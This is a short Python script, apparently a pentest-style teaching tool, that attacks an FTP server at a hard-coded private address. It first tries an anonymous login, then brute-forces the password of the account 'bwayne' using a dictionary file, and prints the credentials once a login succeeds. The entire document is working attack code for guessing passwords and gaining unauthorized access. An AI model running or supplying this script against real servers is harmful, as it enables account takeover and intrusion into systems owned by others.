import ftplib

def connect(host, user, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password)
        ftp.quit()
        return True
    except:
        return False

def main():
    # Variables
    targetHostAddress = '10.0.0.24'
    userName = 'bwayne'
    passwordsFilePath = 'passwords.txt'

    # Try to connect using anonymous credentials
    print('[+] Using anonymous credentials for ' + targetHostAddress)
    if connect(targetHostAddress, 'anonymous', 'test@test.com'):
        print('[*] FTP Anonymous log on succeeded on host ' + targetHostAddress)
    else:
        print('[*] FTP Anonymous log on failed on host ' + targetHostAddress)

    # Try brute force using dictionary
    # Open passwords file
    passwordsFile = open(passwordsFilePath, 'r')

    for line in passwordsFile.readlines():
        password = line.strip('\r').strip('\n')
        print('Testing: ' + str(password))

        if(connect(targetHostAddress, userName, password)):
            #Password found
            print('[*] FTP log on succeeded on host ' + targetHostAddress + '\n' + 'username: ' + userName + '\n' + 'password: ' + password)
            exit(0)
        else:
            print('[*] FTP log on failed on host ' + targetHostAddress + '\n' + 'username: ' + userName + '\n' + 'password: ' + password)

if __name__ == "__main__":
    main()